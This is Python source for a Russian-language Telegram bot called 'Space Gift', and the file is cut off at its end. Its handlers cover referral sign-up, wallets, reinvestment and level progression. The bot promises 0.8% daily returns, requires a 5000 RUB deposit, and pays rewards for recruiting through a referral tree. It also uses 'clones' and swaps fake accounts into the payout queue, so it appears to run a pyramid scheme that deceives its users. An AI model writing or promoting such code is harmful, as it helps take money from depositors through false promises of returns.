import asyncio
import logging
import os
import threading

import pytz
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
# from arrow import utcnow

from back_verify_balance import worker_verify_balance

import datetime
import PayManager
import config
import utils
from FSM import PayFSM, CalculatorFSM, WithdrawMoneyFSM, ChangeCryptTypeFSN, AnswerAfterGiftFSM, \
    SendGiftFSM, PayCryptFSM, UserCodeFSM, WithdrawMoneyPercentFSM, ReinvestFSM, ReinvestInvestFSM
from db import ManagerUsersDataBase, ManagerPayDataBase, ManagerWithDrawDataBase, ConfigDBManager, ManagerResetSystem
import coinbase_data
from User import UserDB
from back_work import worker
from Percent import worker_percent
from back_clones import worker_clones
from jump import worker_jump
import inline_keybords
import logic
import clones
from utils import is_user_subbed, count_total_referrals_by_user

loop = asyncio.new_event_loop()
lock = asyncio.Lock()

PATH = config.PATH

configCl = ConfigDBManager.get()

API_TOKEN = configCl.api_bot  # Считывание токена
bot = Bot(token=API_TOKEN)

NAME_BOT = config.name_bot  # Считывание имени бота
NUMBER_PAY = config.NUMBER_PAY

dp = Dispatcher(bot, storage=MemoryStorage())

db = ManagerUsersDataBase()
dbPay = ManagerPayDataBase()
dbWithDraw = ManagerWithDrawDataBase()
dbSystem = ManagerResetSystem()

message_handlers_commands = ["💳 Кошелёк", "🚀 Взлёт", "🔧 Инструменты", "📝 О проекте", "🌑 Space Money",
                             "⚙ Тех. поддержка"]


@dp.message_handler(commands=['start'])  # Обработка команды /start
async def send_welcome(message: types.Message, state: FSMContext):
    if message.chat.type == "private":
        if not await db.exists_user(message.from_user.id, loop):
            referrer_id = message.get_args()
            async with state.proxy() as data:
                data['referrer_id'] = referrer_id if referrer_id else None
                data['join_date'] = datetime.date.today()

            with open(PATH + "/Data/start_text.txt", 'r', encoding='utf8') as file:
                reply = file.read()
            with open(PATH + "/img/login.png", 'rb') as file:
                await bot.send_photo(
                    message.from_user.id,
                    photo=file,
                    caption=reply,
                    reply_markup=inline_keybords.get_start_inline(),
                    parse_mode="HTML"
                )
        else:
            await message.answer("Добро пожаловать!", reply_markup=inline_keybords.profile_markup())


@dp.callback_query_handler(text="login")  # Регистрирование пользователя и проверка рефералки
async def login_after_callback(callback: types.CallbackQuery, state: FSMContext):
    async with state.proxy() as data:
        if 'referrer_id' not in data:
            return await bot.send_message(
                callback.from_user.id,
                "Возникли технические неполадки 😢\n\nПожалуйста, перейдите по ссылке реферала ещё раз"
            )
        referrer_id = data['referrer_id']

    if referrer_id == callback.from_user.id:
        await bot.send_message(callback.from_user.id,
                               "Нельзя регистрироваться по собственной реферальной ссылке!\n"
                               f"Чтобы начать регистрацию перейдите по https://t.me/{NAME_BOT}?start=855151774")
        return
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(callback.from_user.id,
                           "Пользовательское соглашение Space Gift и политика конфиденциальности"
                           "\nhttps://telegra.ph/Polzovatelskoe-soglashenie-Space-Gift-12-30",
                           reply_markup=inline_keybords.accept_inline())


@dp.callback_query_handler(text="capcha")  # Капча
async def capcha_callback(callback: types.CallbackQuery):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    await inline_keybords.create_capcha(bot, callback.from_user.id)


@dp.callback_query_handler(text="right")  # Если капча правильная, то спрашиваем о регистрации к пользователю
async def sure_quest(callback: types.CallbackQuery, state: FSMContext):
    async with state.proxy() as data:
        if 'referrer_id' not in data:
            return await bot.send_message(
                callback.from_user.id,
                "Возникли технические неполадки 😢\n\nПожалуйста, перейдите по ссылке реферала ещё раз"
            )
        referrer_id = data['referrer_id']
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    if referrer_id is not None:
        await bot.send_message(callback.from_user.id,
                               f"Верно ✅\n\nВы регистрируетесь к участнику @{await db.get_user_name(referrer_id, loop)}\n\n"
                               f"После регистрации смена наставника невозможна!\n"
                               f"Вы подтверждаете регистрацию?", reply_markup=inline_keybords.sure_login())
    else:
        await bot.send_message(callback.from_user.id,
                               f"Верно ✅\n\nВы не регистрируетесь ни к какому участнику\n"
                               f"После регистрации изменить что либо невозможно!\n"
                               f"Вы подтверждаете регистрацию?", reply_markup=inline_keybords.sure_login())


@dp.callback_query_handler(text="no_ans")  # Если он откажется
async def no_ans(callback: types.CallbackQuery):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(callback.from_user.id, "Для возобновления используйте команду /start")


@dp.callback_query_handler(text="yes_ans")  # Если он согласится
async def yes_ans(callback: types.CallbackQuery):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(
        callback.from_user.id,
        "🔐 Теперь Вам нужно придумать код-текст для восстановления "
        "вашего профиля в случай потери ( лучше записать ) Придумать данный код:👇"
    )
    await UserCodeFSM.code.set()


@dp.message_handler(state=UserCodeFSM.code)
async def code(message: types.Message, state: FSMContext):
    async with lock:
        async with state.proxy() as data:
            if 'referrer_id' not in data:
                return await bot.send_message(
                    callback.from_user.id,
                    "Возникли технические неполадки 😢\n\nПожалуйста, перейдите по ссылке реферала ещё раз"
                )
            referrer_id = data['referrer_id']
            join_date = data['join_date']
        utc_now = pytz.utc.localize(datetime.datetime.utcnow())
        date_time_now = utc_now.astimezone(pytz.timezone("UTC"))
        await db.add_user(loop, message.from_user.first_name, message.from_user.id, join_date, date_time_now,
                          user_name=message.from_user.username, referrer_id=referrer_id,
                          last_withd=date_time_now, code=message.text)

        if referrer_id is not None:
            await db.update_count_ref(referrer_id, loop)
            if message.from_user.username is None:
                nick = f"{message.from_user.first_name} ({message.from_user.id})"
            else:
                nick = f'@{message.from_user.username}'
            await bot.send_message(
                referrer_id,
                f"По вашей реферальной ссылке зарегистрировался {nick}"
            )

        with open(PATH + "/img/login_done.png", 'rb') as file:
            await bot.send_photo(
                message.from_user.id,
                photo=file,
                caption="Регистрация прошла успешно! Добро пожаловать в Space Gift, "
                        "чтобы начать движение в системе дарения, нажмите кнопку \n🚀 Взлёт",
                reply_markup=inline_keybords.profile_markup(),
                parse_mode="HTML"
            )
        await state.reset_state(with_data=True)


@dp.callback_query_handler(text="except")  # Если капча не правильная
async def except_capcha(callback: types.CallbackQuery):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(callback.from_user.id, "Ошибка ❌! Попробуйте еще раз")
    await inline_keybords.create_capcha(bot, callback.from_user.id)


@dp.callback_query_handler(text="cancel")
async def cancel_capcha(callback: types.CallbackQuery):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(callback.from_user.id, "Для возобновления используйте команду /start")


@dp.message_handler(lambda mes: mes.text == message_handlers_commands[1])  # Взлет
async def launch(message: types.Message):
    #return
    if not (await is_user_subbed(bot, config.SUB_GROUP, message.from_user.id)):
        keyboard = types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton(
                text="😇 Подписаться",
                url='https://t.me/spacegiftbot',
            )
        )
        return await message.answer(
            text=f"<b>Чтобы пользововаться ботом, вам нужно подписаться "
                 f"на нашу официальную группу</b> https://t.me/spacegiftbot\n\n",
            parse_mode='html',
            reply_markup=keyboard,
        )

    dep = await db.get_deposit(message.from_user.id, loop)
    status = await db.get_status(message.from_user.id, loop)
    planet = await db.get_planet(message.from_user.id, loop)
    step = await db.get_step(message.from_user.id, loop)

    user_topups = await dbPay.get_user_topups(message.from_user.id, loop)

    if int(planet[0]) == 5 and int(step) == 5:
        await message.answer("Поздравляю, ты красавчик!")
        return

    elif (status[0] == 1 or int(planet[0]) > 0 or dep >= 5000): #and user_topups > 0:
        await logic.get_launch(bot, message.from_user.id, loop)
        return

    else:
        text = "Для того чтобы взлететь, Вам нужно пополнить кошелек на 5000 RUB"

        with open(PATH + "/img/add_dep.png", "rb") as file:
            await bot.send_photo(
                chat_id=message.from_user.id,
                photo=file,
                caption=text,
                reply_markup=inline_keybords.takeoff()
            )


@dp.message_handler(lambda mes: mes.text == message_handlers_commands[2])
async def tools(message: types.Message):
    if not (await is_user_subbed(bot, config.SUB_GROUP, message.from_user.id)):
        keyboard = types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton(
                text="😇 Подписаться",
                url='https://t.me/spacegiftbot',
            )
        )
        return await message.answer(
            text=f"<b>Чтобы пользововаться ботом, вам нужно подписаться "
                 f"на нашу официальную группу</b> https://t.me/spacegiftbot\n\n",
            parse_mode='html',
            reply_markup=keyboard,
        )

    await message.answer("Выберите пункт", reply_markup=inline_keybords.get_tools())


@dp.message_handler(lambda mes: mes.text == message_handlers_commands[3])
async def about_project(message: types.Message):
    if not (await is_user_subbed(bot, config.SUB_GROUP, message.from_user.id)):
        keyboard = types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton(
                text="😇 Подписаться",
                url='https://t.me/spacegiftbot',
            )
        )
        return await message.answer(
            text=f"<b>Чтобы пользововаться ботом, вам нужно подписаться "
                 f"на нашу официальную группу</b> https://t.me/spacegiftbot\n\n",
            parse_mode='html',
            reply_markup=keyboard,
        )

    await bot.send_video(
        message.from_user.id,
        'BAACAgIAAxkBAAEEP5Vj0rgthFrz6A6cgh3RfCOKSJ39PwACQSQAApHkmEoBpoIsYNqUky0E',
        caption='Выберите пункт 👇',
        reply_markup=inline_keybords.get_about_project()
    )


@dp.message_handler(lambda mes: mes.text == "💰 Калькулятор")
async def read_numb(message: types.Message):
    await message.answer("▪ Введите сумму, которую хотите рассчитать:")
    await CalculatorFSM.COUNT_REFERRER.set()


@dp.message_handler(lambda mes: mes.text == "👥 Реферальная ссылка")
async def ref(message: types.Message):
    total_sum_pay = await dbPay.get_total_topup_sum(loop)
    total_sum_pay_crypt = await dbPay.get_total_topup_sum_crypt(loop)
    total_sum = 0

    if total_sum_pay:
        total_sum += total_sum_pay
    if total_sum_pay_crypt:
        total_sum += total_sum_pay_crypt

    all_users = await db.get_users(loop, extended=True)
    top_planet = max(int(x[11]) for x in all_users)

    ref_count = await db.get_count_ref(message.from_user.id, loop)
    active_ref_count = await db.get_count_active_ref(message.from_user.id, loop)

    total_tree_ref_count_info = await count_total_referrals_by_user(message.from_user.id, 7, loop)
    total_tree_ref_count = total_tree_ref_count_info['total']
    total_tree_ref_count_activated = total_tree_ref_count_info['activated']

    all_count = await db.invested_users_count(loop)

    if top_planet == 0:
        best_planet = '---'
    else:
        best_planet = logic.planets[top_planet - 1]

    ref_user = await db.get_referrer_of_user(message.from_user.id, loop)
    if not ref_user:
        ref_user_str = ''
    else:
        ref_user_str = '😇 Ваш пригласитель: {}\n\n'
        ref_user_obj = (await db.get_full_data(ref_user, loop))[0]
        print(ref_user_obj)
        if not ref_user_obj[7]:
            ref_nick = f'<a href="tg://user?id={ref_user}"> {ref_user_obj[3]} </a>'
        else:
            ref_nick = f'@{ref_user_obj[7]}'
        ref_user_str = ref_user_str.format(ref_nick)

    answer_text = ref_user_str + f'''<b> 🤖 Ваш ID: {message.from_user.id} </b>

👥 Всего приглашенных рефералов: <b>{ref_count}</b>
🧑‍💼 Всего активированных рефералов: <b>{active_ref_count}</b>

Ваша команда:
🫂 Всего людей в структуре: <b>{total_tree_ref_count}</b>
👩🏻‍🚀 Всего активных людей в структуре: <b>{total_tree_ref_count_activated}</b> 

✨ Всего людей инвестировали в проект: <b>{all_count}</b>

🎁 Сумма пополнений в проекте: <b>{f"{int(total_sum):,}".replace(',', '.')}</b>
🪐 Лучшая достигнутая планета: <b>{best_planet}</b>

Ваша реферальная ссылка:
https://t.me/{NAME_BOT}?start={message.from_user.id}'''

    with open(PATH + "/img/referrer.png", 'rb') as file:
        await bot.send_photo(
            message.from_user.id,
            photo=file,
            caption=answer_text,
            reply_markup=inline_keybords.get_tools(),
            parse_mode="HTML"
        )


@dp.callback_query_handler(text="invite_new_person")
async def invite_new_person(callback: types.CallbackQuery):
    await bot.send_message(
        callback.from_user.id,
        f"Ваша реферальная ссылка:\nhttps://t.me/{NAME_BOT}?start={callback.from_user.id}\n"
    )


@dp.message_handler(text="О Space Gift")
async def about_space_gift(message: types.Message):
    with open(PATH + "/Data/about_space_gift.txt", 'r', encoding="utf-8") as file:
        await message.reply(file.read(), parse_mode="HTML")


@dp.message_handler(text="O Space Money")
async def about_space_gift(message: types.Message):
    with open(PATH + "/Data/space_money.txt", 'r', encoding="utf-8") as file:
        text = file.read()

    with open(PATH + "/img/about_space_money.png", 'rb') as file:
        await bot.send_photo(
            message.from_user.id,
            photo=file,
            caption=text,
            parse_mode="HTML"
        )


@dp.message_handler(text="🚀 Инвестиции в Space Gift")
async def about_space_gift(message: types.Message):
    with open(PATH + "/Data/invest_space_gift.txt", 'r', encoding="utf-8") as file:
        text = file.read()

        await message.answer(text + '<a href="https://i.ibb.co/bHwgnkk/invest-space-gift.png">.</a>', parse_mode="HTML")


@dp.message_handler(text="📄 Презентация")
async def about_space_gift(message: types.Message):
    await bot.send_document(
        chat_id=message.from_user.id,
        document="BQACAgIAAxkBAAEEP1xj0rbTCbq76nmkDBKT9kAP3C-WDwACISQAApHkmErvMRT4cF5Gpy0E",
    )


@dp.message_handler(text="💫 Инвестиции в Space Money")
async def about_space_gift(message: types.Message):
    with open(PATH + "/Data/invest_space_money.txt", 'r', encoding="utf-8") as file:
        text = file.read()

        await message.answer(text + '<a href="https://i.ibb.co/b63Y80B/invest-space-money.png">.</a>',
                             parse_mode="HTML", reply_markup=inline_keybords.get_link_space_money())


@dp.callback_query_handler(text="link_to_space_money")
async def link_to_space_money(callback: types.CallbackQuery):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    with open(PATH + "/Data/invest_space_money.txt", 'r', encoding="utf-8") as file:
        text = file.read()

        await bot.send_message(callback.from_user.id,
                               text + '<a href="https://i.ibb.co/b63Y80B/invest-space-money.png">.</a>',
                               parse_mode="HTML", reply_markup=inline_keybords.get_link_space_money())


@dp.message_handler(text="🎁 Система дарения")
async def about_space_gift(message: types.Message):
    with open(PATH + "/Data/system_gift.txt", 'r', encoding="utf-8") as file:
        text = file.read()
        await message.answer(text + '<a href="https://i.ibb.co/HxQPmC9/gift.png">.</a>', parse_mode='HTML')


'''
@dp.message_handler(text="🤖 Система клонов")
async def about_space_gift(message: types.Message):
    with open(PATH + "/Data/system_clones.txt", 'r', encoding="utf-8") as file:
        text = file.read()

        await message.answer(text + '<a href="https://i.ibb.co/wYdbyyt/system-clones.png">.</a>', parse_mode="HTML")
'''


@dp.message_handler(text="🤑 Вознаграждение за приглашение")
async def about_space_gift(message: types.Message):
    with open(PATH + "/Data/gift_of_invite.txt", 'r', encoding="utf-8") as file:
        text = file.read()

        await message.answer(text + '<a href="https://i.ibb.co/q7rvfgX/gift-of-invite.png">.</a>', parse_mode="HTML")


@dp.message_handler(text="🤑 Вознаграждение за пополнение реферала")
async def about_space_gift(message: types.Message):
    with open(PATH + "/Data/gift_of_ref.txt", 'r', encoding="utf-8") as file:
        text = file.read()

        await message.answer(text + '<a href="https://i.ibb.co/R6XB6dM/gift-of-ref.png">.</a>', parse_mode="HTML")


@dp.message_handler(text="👥 Условия для сетевиков")
async def about_space_gift(message: types.Message):
    with open(PATH + "/Data/cond_for_set.txt", 'r', encoding="utf-8") as file:
        text = file.read()

        await message.answer(text + '<a href="https://i.ibb.co/h7QfjsN/cond-of-set.png">.</a>', parse_mode="HTML")


@dp.message_handler(text="💻 Инвестиции")
async def invest(message: types.Message):
    dep = await db.get_deposit(message.from_user.id, loop)
    money_out = await db.get_gift_money_invest(message.from_user.id, loop)
    day_percent = f"{round(dep * .008, 5)} руб/день"

    await message.answer(
        f"▪ Инвестируя в Space gift вы будете получать 0,8% в сутки а так же "
        f"система умножит ваши вложения, что бы продвинуть живую очередь на "
        f"получение подарков! ( Благодаря системе клонов )\n\n"
        f"📠 Процент от инвестиций: 0.8% в сутки\n"
        f"⏱ Время доходности: 24 часа\n"
        f"📆 Срок вклада: Бессрочный c возможностью вывода через 100 дней\n\n"
        f"💳 Ваш вклад: {dep} RUB\n"
        f"💵 Пассив: {day_percent}\n"
        f"💵 На вывод: {money_out}₽\n"
        f"<b>Комиссия на вывод - 5%</b>",
        reply_markup=inline_keybords.invest_buttons(),
        parse_mode='html'
    )


@dp.message_handler(lambda mes: mes.text == message_handlers_commands[5])
async def support(message: types.Message):
    await message.answer("По любым вопросам пишите @smfadmin \nОтветит в течении часа!")


'''
@dp.message_handler(lambda mes: mes.text == "Тестовые клоны")
async def TestClones(message: types.Message):
    await message.answer("Создано 20 клонов")
    await clones.create_clones(100_000, loop)


@dp.message_handler(lambda mes: mes.text == "Тестовое пополнение")
async def TestPay(message: types.Message):
    async with lock:
        await db.add_money(message.from_user.id, 5000, loop)
        #await db.set_now_depozit(message.from_user.id, 5000, loop)
        await db.add_depozit(message.from_user.id, 5000, loop)
        await message.answer("Баланс пополнен")
'''


@dp.callback_query_handler(text="system_clones")
async def system_clones(callback: types.CallbackQuery):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    with open(PATH + "/Data/system_clones.txt", 'r', encoding="utf-8") as file:
        text = file.read()

        await bot.send_message(
            callback.from_user.id,
            text + '<a href="https://i.ibb.co/wYdbyyt/system-clones.png">.</a>', parse_mode="HTML"
        )


'''
@dp.message_handler(lambda mes: mes.text == "Удалить аккаунт")
async def deleteacc(message: types.Message):
    await message.answer("Аккаунт удален, перезапустите бота \n/start")
    await db.delete_acc(message.from_user.id, loop)
'''


@dp.callback_query_handler(text='reinvest')
async def reinvest(callback: types.CallbackQuery):
    return await callback.answer("🚫 Реинвестирование временно недоступно", show_alert=True)
    async with lock:
        gift_money = await db.get_gift_money(callback.from_user.id, loop)
        if gift_money <= 0:
            await callback.answer("🚫 У вас недостаточно средств для реинвестирования", show_alert=True)
            return

        await bot.send_message(
            callback.from_user.id,
            'Введите сумму, которую хотите реинвестировать'
        )
        await ReinvestFSM.amount.set()


@dp.message_handler(state=ReinvestFSM.amount)
async def reinv_amount(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        global message_handlers_commands
        if message.text in message_handlers_commands:
            await state.reset_state(with_data=True)

            if message.text == "💳 Кошелёк":
                await wallet(message)
            elif message.text == "🚀 Взлёт":
                await launch(message)
            elif message.text == "🔧 Инструменты":
                await tools(message)
            elif message.text == "📝 О проекте":
                await about_project(message)
            elif message.text == "💻 Инвестиции":
                await invest(message)
            elif message.text == "⚙ Техническая поддержка":
                await support(message)

            return

    if not message.text.isdigit():
        await message.answer("Введите правильную сумму")
        return

    gift_money = await db.get_gift_money(message.from_user.id, loop)
    print(gift_money, message.text)
    if int(message.text) > int(gift_money):
        await message.answer(f"Введите правильную сумму. Доступно: {gift_money} руб.")
        return

    gift_money = int(message.text)

    await db.add_reinvest(message.from_user.id, gift_money, loop)
    await db.remove_gift_money(message.from_user.id, gift_money, loop)

    cd = await db.get_amount_gift_money(message.from_user.id, loop)
    dep = await db.get_deposit(message.from_user.id, loop)
    ref = await db.get_activate_count_ref(message.from_user.id, loop) * 5000
    ref_money = await db.get_percent_ref_money(message.from_user.id, loop)
    reinv = await db.get_reinvest(message.from_user.id, loop)

    await bot.send_message(
        message.from_user.id,
        f"Вы реинвестировали {round(gift_money, 2)} RUB теперь Ваш "
        f"общий депозит {int(cd + dep + ref + ref_money + reinv)} RUB"
    )
    await state.reset_state(with_data=True)


@dp.callback_query_handler(text='reinvest_invest')
async def reinvest_invest_money(callback: types.CallbackQuery):
    return await callback.answer("🚫 Реинвестирование временно недоступно", show_alert=True)
    async with lock:
        gift_money_invest = await db.get_gift_money_invest(callback.from_user.id, loop)
        if gift_money_invest <= 0:
            await callback.answer("🚫 У вас недостаточно средств для реинвестирования", show_alert=True)
            return

        await bot.send_message(
            callback.from_user.id,
            'Введите сумму, которую хотите реинвестировать'
        )
        await ReinvestInvestFSM.amount.set()


@dp.message_handler(state=ReinvestInvestFSM.amount)
async def reinv_invest_amount(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        global message_handlers_commands
        if message.text in message_handlers_commands:
            await state.reset_state(with_data=True)

            if message.text == "💳 Кошелёк":
                await wallet(message)
            elif message.text == "🚀 Взлёт":
                await launch(message)
            elif message.text == "🔧 Инструменты":
                await tools(message)
            elif message.text == "📝 О проекте":
                await about_project(message)
            elif message.text == "💻 Инвестиции":
                await invest(message)
            elif message.text == "⚙ Техническая поддержка":
                await support(message)

            return

    if not message.text.isdigit():
        await message.answer("Введите правильную сумму")
        return

    gift_money_invest = await db.get_gift_money_invest(message.from_user.id, loop)
    if int(message.text) > int(gift_money_invest):
        await message.answer(f"Введите правильную сумму. Доступно: {gift_money_invest} руб.")
        return

    gift_money_amount = int(message.text)

    await db.add_depozit(message.from_user.id, gift_money_amount, loop)
    await db.remove_gift_money_invest(message.from_user.id, gift_money_amount, loop)

    dep = await db.get_deposit(message.from_user.id, loop)

    await bot.send_message(
        message.from_user.id,
        f"Вы реинвестировали <b>{round(gift_money_amount, 2)} RUB</b>\nТеперь Ваш депозит <b>{dep} RUB</b>",
        parse_mode='html'
    )

    await state.reset_state(with_data=True)


@dp.message_handler(lambda mes: mes.text == message_handlers_commands[4])
async def space_go(message: types.Message):
    if not (await is_user_subbed(bot, config.SUB_GROUP, message.from_user.id)):
        keyboard = types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton(
                text="😇 Подписаться",
                url='https://t.me/spacegiftbot',
            )
        )
        return await message.answer(
            text=f"<b>Чтобы пользововаться ботом, вам нужно подписаться "
                 f"на нашу официальную группу</b> https://t.me/spacegiftbot\n\n",
            parse_mode='html',
            reply_markup=keyboard,
        )

    await message.answer(
        "💫 Space money\n\nℹ Мы используем <b><i>новое направление</i></b> крипто арбитража для крупных ивестеров. "
        "Депозит будет передаваться в управление специалистам, которые работают с большими "
        "депозитами, за счет этого с <b><i>больщим депозитом</i></b> можно будет получать "
        "<b><i>повышенный процент</i></b> доходности\n\n👍🏻 Также <b><i>особенностью и преимуществом</i></b> данного "
        "направления является доступность <b><i>депозита к снятию в короткие сроки</i></b> - через 7, 14 или 21 дней, "
        "в зависимости от выбранного тарифа\n\nЧтобы пополнить депозит, необходимо обратиться к оператору: @smfadmin",
        parse_mode="HTML",
        reply_markup=inline_keybords.get_link_to_space_money()
    )


@dp.message_handler(lambda mes: mes.text == message_handlers_commands[0])  # Кошелек
async def wallet(message: types.Message):
    #await worker_verify_balance(loop)
    if not (await is_user_subbed(bot, config.SUB_GROUP, message.from_user.id)):
        keyboard = types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton(
                text="😇 Подписаться",
                url='https://t.me/spacegiftbot',
            )
        )
        return await message.answer(
            text=f"<b>Чтобы пользововаться ботом, вам нужно подписаться "
                 f"на нашу официальную группу</b> https://t.me/spacegiftbot\n\n",
            parse_mode='html',
            reply_markup=keyboard,
        )

    async with lock:
        with open(PATH + "/img/bal.jpg", 'rb') as file:
            level = int((await db.get_step(message.from_user.id, loop))[0])

            level_text = f"Уровень {level}"

            status = await db.get_status(message.from_user.id, loop)
            active = await db.get_active(message.from_user.id, loop)

            text_status = " ❌"
            if status[0] == 1:
                text_status = " ✅"

            if level == 1 and status[0] == 0:
                level_text = "В ожидании"
            elif active == 0 and status[0] == 1:
                level_text = "В очереди"

            cd = await db.get_amount_gift_money(message.from_user.id, loop)
            ref = await db.get_activate_count_ref(message.from_user.id, loop) * 5000
            last_month_active_count = await db.last_month_refs(message.from_user.id, loop)
            last_month_passive = last_month_active_count * 500

            last_month_ref_passive = await db.get_last_month_ref_count(message.from_user.id, loop) * 5000
            ref_money = await db.get_percent_ref_money(message.from_user.id, loop)
            reinv = await db.get_reinvest(message.from_user.id, loop)
            date = await db.get_date(message.chat.id, loop)
            archive_dep = await db.get_archive_dep(message.chat.id, loop)

            payments = await dbPay.get_user_topups(message.from_user.id, loop)

            total_referrals = await utils.count_total_referrals_by_user(message.from_user.id, 1, loop)

            in_advance_pay = await dbSystem.get_user_advance_payment(message.from_user.id, loop)
            advance_pay_message = "Нет (0₽) ❌"
            if in_advance_pay is not None:
                advance_pay_message = "Да (5000₽) ✅"

            day_percent = f"{round(float(cd + ref + last_month_passive + last_month_ref_passive + ref_money + reinv + archive_dep) * .008, 5)} руб/день"
            if payments == 0:
                day_percent = f"0 руб/день\n<u>Чтобы получать дивиденды, пополните баланс</u>"

            text = f"🤖 Ваш ID: {message.from_user.id}\n" \
                   f"📆 Профиль создан: {date}\n" \
                   f"🚀 Статус: {level_text} {text_status}\n" \
                   f"✨ Оплатил заранее: {advance_pay_message}\n" \
                   f"👥 Лично приглашенные за всё время: {total_referrals['total']}\n" \
                   f"🙋‍♂️ Лично приглашенные в этом месяце: {await db.get_count_ref(message.from_user.id, loop)} " \
                   f"({await db.get_activate_count_ref(message.from_user.id, loop)})\n" \
                   f"♻️ Повторно зашедшие рефералы: {last_month_active_count}\n" \
                   "Ваш депозит: 💰👇\n" \
                   "——————————————————\n" \
                   f"🏦 Общие накопления в системе дарения - {int(archive_dep)}₽\n" \
                   f"🎁 Системы дарения - {int(cd)}₽\n" \
                   f"🤑 За приглашения - {int(ref) + int(last_month_passive) + int(last_month_ref_passive)}₽\n" \
                   f"😱 За инвестиции реферала - {int(ref_money)}₽\n" \
                   f"🪙 Вы реинвестировали - {int(reinv)}₽\n" \
                   "——————————————————\n" \
                   f"💵 Общий депозит: {int(cd + ref + last_month_passive + last_month_ref_passive + ref_money + reinv + archive_dep)}₽\n" \
                   f"💵 Пассив: {day_percent}!\n" \
                   f"💵 На вывод: {await db.get_gift_money(message.from_user.id, loop)}₽ \n" \
                   "( минимальная сумма вывода 1000₽ )"

            await bot.send_photo(
                message.chat.id,
                photo=file,
                caption=text,
                reply_markup=inline_keybords.get_wallet_inline(),
                parse_mode='html'
            )


@dp.message_handler(lambda mes: mes.text == "⬅ Вернуться")
async def back(message: types.Message):
    await message.answer("Вернулся", reply_markup=inline_keybords.profile_markup())


@dp.callback_query_handler(text="calculate")
async def calc_callback(callback: types.CallbackQuery):
    await bot.send_message(
        callback.from_user.id,
        "▪ Введите сумму, которую хотите рассчитать:"
    )
    await CalculatorFSM.COUNT_REFERRER.set()


@dp.callback_query_handler(text="get_gift_from_space_gift")
async def get_gift_from_space_gift(callback: types.CallbackQuery):
    async with lock:
        status = (await db.get_status(callback.from_user.id, loop))[0]
        if status == 1:
            now_dep = await db.get_now_depozit(callback.from_user.id, loop)

            await db.add_gift_space_money(callback.from_user.id, now_dep, loop)
            # await db.add_money(callback.from_user.id, now_dep, loop)
            # await db.add_amount_gift_money(callback.from_user.id, now_dep, loop)
            # await db.set_now_depozit(callback.from_user.id, 0, loop)
            try:
                await bot.delete_message(
                    callback.from_user.id,
                    callback.message.message_id
                )
            except:
                ...
            await bot.send_message(
                callback.from_user.id,
                f"Поздравляем! 🎉 Space Gift подарил вам {now_dep} RUB 🙌"
            )
            try:
                await bot.delete_message(callback.from_user.id, callback.message.message_id)
            except:
                pass
            await logic.get_launch(bot, callback.from_user.id, loop)


@dp.callback_query_handler(text="inform_pers_ok")
async def inform_pers_ok(callback: types.CallbackQuery):
    await bot.delete_message(callback.from_user.id, callback.message.message_id)


@dp.callback_query_handler(text="inform_pers")
async def inform_pers(callback: types.CallbackQuery, state: FSMContext, user: UserDB = None, answer=None):
    data = await state.get_data()
    if not data or len(data) == 0:
        await bot.send_message(
            callback.from_user.id,
            "Вы не сделали никому подарок, чтобы  его сделать нажмите на 🎁 Сделать подарок"
        )
        return

    id = data.get("WHOM")
    amount = data.get("AMOUNT")

    await bot.delete_message(callback.from_user.id, callback.message.message_id)

    if id != "None":
        await db.set_gift_id(callback.from_user.id, id, loop)
        try:
            await bot.send_message(
                int(id),
                f"Участник @{await db.get_user_name(callback.from_user.id, loop)} подарил "
                f"{amount} RUB на ваш депозит"
            )
        except:
            pass

        if int(user.step) < 5:
            await db.update_step(user.user_id, loop)
            step = await db.get_step(int(user.user_id), loop)
            text_planet = logic.get_photo(user.planet)
            sum_gift = logic.sums[text_planet[0]]

            await db.set_now_depozit_for_step(callback.from_user.id, sum_gift, loop)

            await logic.get_launch(bot, callback.from_user.id, loop)
            if int(step) == 5:
                if int(await db.get_count_ref(user.user_id, loop)) >= logic.count_ref[int(user.planet)]:
                    await logic.gift(bot, user, loop)
                    if int(user.planet) < 5:
                        await db.update_new_step(user.user_id, loop)

                        # Удаление фэйк акка
                        if (await db.get_referrer_of_user(user.user_id, loop)) == '1':
                            fake_user = await db.get_fake_user(user.user_id, loop)
                            await db.remove_fake_user(user.user_id, loop)
                            await db.add_fake_user(user.user_id, fake_user[0], fake_user[1], loop)

                        new_user: UserDB = (
                            await logic.get_user_on_planet((await db.get_planet(callback.from_user.id, loop))[0],
                                                           callback.from_user.id, loop))

                        await db.remove_depozit(user.money, answer, loop)
                        if new_user:
                            try:
                                await bot.send_message(
                                    new_user.user_id,
                                    "Поздравляем 🎉🎊\nВы попали на уровень 1✅\nНажмите кнопку 🚀 Взлет"
                                )
                            except:
                                pass
                    else:
                        try:
                            await bot.send_message(
                                user.user_id,
                                "Вы закончили игру"
                            )
                        except:
                            pass
                else:
                    await bot.send_message(
                        user.user_id,
                        "У вас недостаточно приглашенных пользователей для перехода на новый уровень"
                    )
    await state.reset_state(with_data=True)


@dp.callback_query_handler(text="ok_gift")
async def ok_gift(callback: types.CallbackQuery):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(
        callback.from_user.id,
        "Напишите текст для отправки"
    )
    await AnswerAfterGiftFSM.MESSAGE.set()


@dp.message_handler(state=AnswerAfterGiftFSM.MESSAGE)
